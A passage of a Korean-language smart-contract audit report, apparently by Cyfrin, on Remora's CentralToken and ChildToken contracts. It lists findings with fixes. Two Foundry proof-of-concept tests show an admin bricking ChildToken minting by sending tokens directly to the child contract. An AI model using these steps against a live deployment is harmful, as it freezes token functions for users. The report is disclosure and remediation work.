**설명:** `transfer` 함수에는 관리자가(실수로든 아니든) `CentralToken`을 `ChildToken`으로 직접 보내는 것을 방지하는 `_checkAllowedAdmin(to)`가 포함되어 있습니다.

```solidity
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) return true;
        _checkAllowedAdmin(to);
        return super.transfer(to, amount);
    }
```

그러나 `transferFrom`은 재정의되지 않았으므로 관리자가 다음을 수행할 수 있습니다.
- `CentralToken` 컨트랙트 `approve`
- `transferFrom(address(this), childToken, amount)` 호출 (일부 `childToken` 및 `amount`에 대해)

이것은 `mint`에 다음 확인이 포함되어 있기 때문에 `ChildToken` 컨트랙트의 발행을 즉시 차단(brick)합니다.

```solidity
function mint(address to, uint256 amount) external whenNotPaused {
...
        if(ICentralToken(cToken).balanceOf(address(this)) != totalSupply() + amount)
            revert CentralBalanceInvariant();
```

**영향:** 관리자의 전송은 깨진 불변성을 가진 `ChildToken`으로 토큰을 보낼 때 `CentralToken::dynamicTransfer`가 호출되는 것을 영구적으로 비활성화할 수 있습니다.

또한 직접 전송된 토큰은 `ChildToken`이 발행된 적이 없기 때문에 `ChildToken::burn`을 사용하여 복구할 수 없습니다.

**개념 증명 (Proof of Concept):** `CentralTokenTest.t.sol`에 이 테스트를 추가하십시오.

```solidity
function test_cyfrin_brickMintingInChildToken() public {
    address dom = getDomesticUser(0);
    centralTokenProxy.mint(address(this), uint64(4));

    // send 1 token to the child contract directly, after approving
    centralTokenProxy.approve(address(this), type(uint256).max);
    centralTokenProxy.transferFrom(address(this), address(d_childTokenProxy), 1);

    vm.expectRevert(bytes4(keccak256("CentralBalanceInvariant()")));
    centralTokenProxy.dynamicTransfer(dom, 3);
}
```

**권장 완화 조치:**
1. 다음 정의로 `transferFrom`을 재정의하십시오.

```solidity
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    if (amount == 0) return true;
    _checkAllowedAdmin(to);
    return super.transferFrom(from, to, amount);
}
```

2. 엄격하게 필요하지 않은 경우 `approve` 기능을 비활성화하는 것도 가치가 있을 수 있습니다.

3. 또한 `Allowlist.addUser`를 업데이트하여 사용자의 주소가 컨트랙트인지 확인하거나, 컨트랙트를 허용하려는 경우 `ChildToken`의 인터페이스를 충족하지 않는지 확인하는 것도 가치가 있을 수 있습니다.

**Remora:** 커밋 [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484)에서 수정됨.

**Cyfrin:** 확인함. `transfer()` 및 `transferFrom()`이 재정의되었으며, 수신자가 ChildToken이 되는 것을 방지하기 위한 유효성 검사가 추가되었습니다.


### `allowUser`가 `ChildToken` 컨트랙트에 관리자 권한을 할당하는 것을 명시적으로 거부하는 것 고려

**설명:** 하위 토큰의 1:1 불변성은 다음과 같이 깨질 수 있습니다.

관리자:
- 하위 토큰 컨트랙트에서 `allowUser`를 호출합니다.
- `transfer`를 호출하여 중앙 토큰을 하위 토큰으로 직접 보냅니다.

이것은 1:1 불변성을 깨뜨립니다.

이것은 분명히 악의적인 관리자만이 할 수 있는 일이므로 정보성으로 분류되었습니다.

**영향:** 하위 토큰의 1:1 불변성이 깨져 추가 발행이 차단됩니다.

**개념 증명 (Proof of Concept):** `CentralTokenTest.t.sol`에 이것을 추가하십시오.

```solidity
    function test_cyfrin_brickMintingByAllowingChildTokenAsAdmin() public {
        address dom = getDomesticUser(0);
        centralTokenProxy.mint(address(this), uint64(4));

        allowListProxy.allowUser(address(d_childTokenProxy), true, true, true);
        centralTokenProxy.transfer(address(d_childTokenProxy), 1);


        vm.expectRevert(bytes4(keccak256("CentralBalanceInvariant()")));
        centralTokenProxy.dynamicTransfer(dom, 3);
    }
```
**Remora:** 커밋 [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484)에서 수정됨.

**Cyfrin:** 확인함. `transfer()` 및 `transferFrom()`이 재정의되어 ChildToken이 직접 전송 또는 transferFrom을 통해 CentralToken을 수신하는 것을 방지합니다.


### `FiveFiftyRule::checkCanTransfer` 및 `FiveFiftyRule::canTransfer`의 로직이 미묘하게 다를 수 있음

**설명:** `FiveFiftyRule` 컨트랙트의 `checkCanTransfer` 및 `canTransfer` 함수에는 실행 결과가 다를 수 있는 미묘한 차이가 있습니다.
가장 두드러진 차이점은 아래 스니펫에 나와 있습니다.
1. `canTransfer`에서는 조건에서 `gid`를 고려합니다.
2. `checkCanTransfer`에서는 조건에서 `gid`를 고려하지 않습니다.

```solidity
//FiveFiftyRule.sol//
    function canTransfer(address from, address to, uint256 amount) external returns (bool) {
        ...

        // to side changes
        if (to != address(0)) {
            ...
            } else if (gId == 0 && iTo.numCatalyst != 0 &&
                !_updateEntityAllowance(false, to, amount)
            ) revert();

            ...
        }

        ...
    }

function checkCanTransfer(
    address to,
    uint256 amount
) external view returns (bool _output) {
    ...
    } else if (iData.numCatalyst != 0 &&
        !_checkEntityAllowance(to, amount)
    ) return false;

    ...
}

```

**권장 완화 조치:** 공통 로직을 내부 함수로 팩토링하여 동일한 로직을 갖도록 하는 것을 고려하십시오.

**Remora:** 인지함.

**Cyfrin:** 확인함.


### `TokenBank::setCustodian`은 관리인(custodian)이 ADMIN 권한을 가지고 있는지 확인해야 함

**설명:** `TokenBank::setCustodian`이 호출되고 그들이 ADMIN 권한이 없는 경우, `safeTransfer` 호출이 간접적으로 다음 구현을 가진 `CentralToken.transfer`를 호출하기 때문에 `TokenBank::removeToken`이 되돌립니다.

```solidity
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) return true;
        _checkAllowedAdmin(to);
        return super.transfer(to, amount);
    }
```

**영향:** 관리자가 `setCustodian`을 다시 호출하거나 관리인에게 ADMIN 권한을 부여할 수 있으므로 미미합니다.

**권장 완화 조치:** `setCustodian`에 한 줄을 추가하십시오.

```solidity
require(allowlist.allowed(newCustodian) && allowlist.isAdmin(newCustodian),
        "Custodian must be allowlist admin");
```

**Remora:** 커밋 [a3ae706](https://github.com/remora-projects/remora-dynamic-tokens/commit/a3ae70627dbeb55ac5f9bfeb6ab4a4512703c6c8)에서 수정됨.

**Cyfrin:** 확인함.


### `CentralToken::addChildToken`에 대한 추가 검증으로 잘못된 `ChildToken` 추가 방지

**설명:** 현재 다음이 가능합니다.
- `centralToken0`을 부모로 설정하는 `childToken0` 생성
- 다른 중앙 토큰에 대해 `centralToken1::addChildToken(centralToken0)` 호출

**권장 완화 조치:** 이 불일치를 방지하기 위해 다음 추가 검증이 권장됩니다.

```diff
+  error ChildTokenNotChildOfThis();
```

```diff
  interface IChildRWAToken {
+     function centralToken() external view returns (address);
      function domestic() external view returns (bool);
      function distributePayout(uint128 amount) external;
      function mint(address to, uint256 amount) external;
      function balanceOf(address account) external view returns (uint256);
      function toggleBurning(bool newState) external;
      function togglePause(bool newState) external;
}
```

```diff
    function addChildToken(
        address tokenAddress
    ) external nonReentrant restricted {
        if (tokenAddress == address(0) || tokenAddress.code.length == 0)
            revert InvalidAddress();

+       if (IChildRWAToken(tokenAddress).centralToken() != address(this)) revert ChildTokenNotChildOfThis();
        // 0 for domestic, 1 for foreign
        bool isDomestic = IChildRWAToken(tokenAddress).domestic();
        uint256 childIndex = isDomestic ? 0 : 1;


        if (childTokens[childIndex] != address(0)) revert ChildTokenAlreadyExists();
        childTokens[uint256(childIndex)] = tokenAddress;

        emit ChildTokenAdded(tokenAddress, isDomestic);
    }
```

**Remora:** 커밋 [846851a](https://github.com/remora-projects/remora-dynamic-tokens/commit/846851ae7f691ed77d235185584ac0fb82b43e77)에서 수정됨.

**Cyfrin:** 확인함.


### 국내 및 외국 하위 토큰에 대해 배열 대신 구조체 사용 고려

**설명:** `CentralToken` 코드는 하위 토큰에 대해 다음 데이터 구조를 사용하여 단순화될 수 있습니다.


```solidity
    struct Children {
        address domestic;
        address foreign;
    }

    Children private children;
```

이렇게 하면 코드가 더 명확해질 것입니다. 현재는 0 = 국내, 1 = 외국임을 기억해야 합니다.

이 도우미 함수는 편의를 유지하기 위해 자식을 반복하는 모든 곳에서 사용할 수 있습니다.

```solidity
    function _forEachChild(function(address) internal fn) internal {
        address a = children.domestic; if (a != address(0)) fn(a);
        a = children.foreign;  if (a != address(0)) fn(a);
    }
```


**Remora:** 커밋 [f753fac](https://github.com/remora-projects/remora-dynamic-tokens/commit/f753faca15ce9bfdcda3ed690c65aba410a22f37)에서 수정됨.

**Cyfrin:** 확인함.

\clearpage

